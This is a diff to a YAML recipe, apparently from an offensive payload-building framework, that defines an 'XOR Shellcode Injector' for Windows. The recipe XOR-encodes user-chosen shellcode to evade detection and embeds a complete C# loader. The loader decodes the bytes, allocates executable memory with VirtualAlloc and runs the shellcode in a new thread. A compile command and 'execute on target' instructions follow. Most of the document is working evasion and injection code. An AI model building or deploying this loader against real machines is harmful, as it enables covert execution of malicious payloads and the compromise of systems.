@@ -1,92 +1,156 @@
-meta:
-  name: "XOR Shellcode Injector (with Shellcode Config)"
-  category: "Examples"
-  description: |
-    Example recipe demonstrating the new shellcode configuration feature.
-    Uses the shellcodes.yaml file to select shellcode generation method.
-    
-    This replaces the old "option" preprocessing type with the new
-    "shellcode" type for cleaner configuration and automatic listener generation.
+versions:
+  - version: 1
+    comment: "Initial version"
+    timestamp: "2026-02-17T00:00:00"
+    original:
+      meta:
+        name: "XOR Shellcode Injector (with Shellcode Config)"
+        category: "Examples"
+        description: |
+          Example recipe demonstrating the new shellcode configuration feature.
+          Uses the shellcodes.yaml file to select shellcode generation method.
 
-  effectiveness: "medium"
-  platform: "Windows"
+          This replaces the old "option" preprocessing type with the new
+          "shellcode" type for cleaner configuration and automatic listener generation.
 
-  mitre:
-    tactic: "TA0005 - Defense Evasion"
-    technique: "T1027 - Obfuscated Files or Information"
+        effectiveness: "medium"
+        platform: "Windows"
 
-  artifacts:
-    - "XOR-encoded shellcode in binary"
-    - "Simple decode loop in code"
-    - "VirtualAlloc and CreateThread API calls"
+        mitre:
+          tactic: "TA0005 - Defense Evasion"
+          technique: "T1027 - Obfuscated Files or Information"
 
-parameters:
-  - name: "xor_key"
-    type: "hex"
-    description: "XOR key (single byte, e.g., 'fa')"
-    required: false
-    default: "fa"
+        artifacts:
+          - "XOR-encoded shellcode in binary"
+          - "Simple decode loop in code"
+          - "VirtualAlloc and CreateThread API calls"
 
-  - name: "output_file"
-    type: "string"
-    description: "Output executable filename"
-    required: true
-    default: "xor_injector.exe"
+      parameters:
+        - name: "xor_key"
+          type: "hex"
+          description: "XOR key (single byte, e.g., 'fa')"
+          required: false
+          default: "fa"
 
-  - name: "output_path"
-    type: "path"
-    description: "Output directory"
-    required: true
-    default: "{config.output_dir}"
+        - name: "output_file"
+          type: "string"
+          description: "Output executable filename"
+          required: true
+          default: "xor_injector.exe"
 
-preprocessing:
-  # NEW: Use shellcode type instead of option type
-  # The GUI will load available shellcodes from shellcodes.yaml
-  # and present them as a dropdown with their specific parameters
-  - type: "shellcode"
-    name: "Select shellcode generation method"
-    output_var: "raw_shellcode"
+        - name: "output_path"
+          type: "path"
+          description: "Output directory"
+          required: true
+          default: "{config.output_dir}"
 
-  # Step 2: Base64 encode for processing
-  - type: "script"
-    name: "encode_b64"
-    script: "base64_encode.py"
-    args:
-      data: "{{ raw_shellcode }}"
-    output_var: "shellcode_b64"
+      preprocessing:
+        - type: "shellcode"
+          name: "Select shellcode generation method"
+          output_var: "raw_shellcode"
 
-  # Step 3: XOR encrypt with key
-  - type: "script"
-    name: "xor_encryption"
-    script: "xor_encrypt.py"
-    args:
-      data: "{{ shellcode_b64 }}"
-      key: "{{ xor_key }}"
-    output_var: "xor_result"
+        - type: "script"
+          name: "encode_b64"
+          script: "base64_encode.py"
+          args:
+            data: "{{ raw_shellcode }}"
+          output_var: "shellcode_b64"
 
-  # Step 4: Format as C# byte array
-  - type: "script"
-    name: "format_payload"
-    script: "format_csharp.py"
-    args:
-      data: "{{ xor_result.encrypted }}"
-      var_name: "buf"
-      bytes_per_line: 15
-    output_var: "csharp_payload"
+        - type: "script"
+          name: "xor_encryption"
+          script: "xor_encrypt.py"
+          args:
+            data: "{{ shellcode_b64 }}"
+            key: "{{ xor_key }}"
+          output_var: "xor_result"
 
-output:
-  type: "template"
-  template: "process_injection/xor_injector.cs"
+        - type: "script"
+          name: "format_payload"
+          script: "format_csharp.py"
+          args:
+            data: "{{ xor_result.encrypted }}"
+            var_name: "buf"
+            bytes_per_line: 15
+          output_var: "csharp_payload"
 
-  compile:
-    enabled: true
-    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
+      output:
+        type: "template"
+        template_ext: ".cs"
+        template: |
+          using System;
+          using System.Runtime.InteropServices;
 
-  launch_instructions: |
-    # The listener command will be automatically generated and inserted above
-    # if the selected shellcode from shellcodes.yaml has a listener defined
+          namespace XorInjector
+          {
+              public class Program
+              {
+                  // P/Invoke declarations
+                  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+                  static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-    # Execute on target
-    {{ output_file }}
+                  [DllImport("kernel32.dll")]
+                  static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-    # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
+                  [DllImport("kernel32.dll")]
+                  static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+                  const uint MEM_COMMIT = 0x00001000;
+                  const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+                  public static void Main(string[] args)
+                  {
+                      // XOR-encoded shellcode (key: 0xfa)
+                      {{ csharp_payload | indent(12) }}
+
+                      Console.WriteLine($"[*] Encoded payload size: {buf.Length} bytes");
+
+                      // Decode the XOR payload (key: 0xfa)
+                      for (int i = 0; i < buf.Length; i++)
+                      {
+                          buf[i] = (byte)((uint)buf[i] ^ 0x{{ xor_key }});
+                      }
+
+                      Console.WriteLine("[+] Payload decoded successfully");
+
+                      // Allocate RWX memory
+                      IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                      if (addr == IntPtr.Zero)
+                      {
+                          Console.WriteLine("[-] Failed to allocate memory!");
+                          return;
+                      }
+                      Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");
+
+                      // Copy shellcode to allocated memory
+                      Marshal.Copy(buf, 0, addr, buf.Length);
+                      Console.WriteLine("[+] Shellcode copied to memory");
+
+                      // Execute shellcode
+                      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                      if (hThread == IntPtr.Zero)
+                      {
+                          Console.WriteLine("[-] Failed to create thread!");
+                          return;
+                      }
+
+                      Console.WriteLine("[+] Shellcode thread created!");
+                      Console.WriteLine("[+] Executing payload...");
+
+                      // Wait for thread to complete
+                      WaitForSingleObject(hThread, 0xFFFFFFFF);
+                  }
+              }
+          }
+
+        compile:
+          enabled: true
+          command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
+
+        launch_instructions: |
+          # The listener command will be automatically generated and inserted above
+          # if the selected shellcode from shellcodes.yaml has a listener defined
+
+          # Execute on target
+          {{ output_file }}
+
+          # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
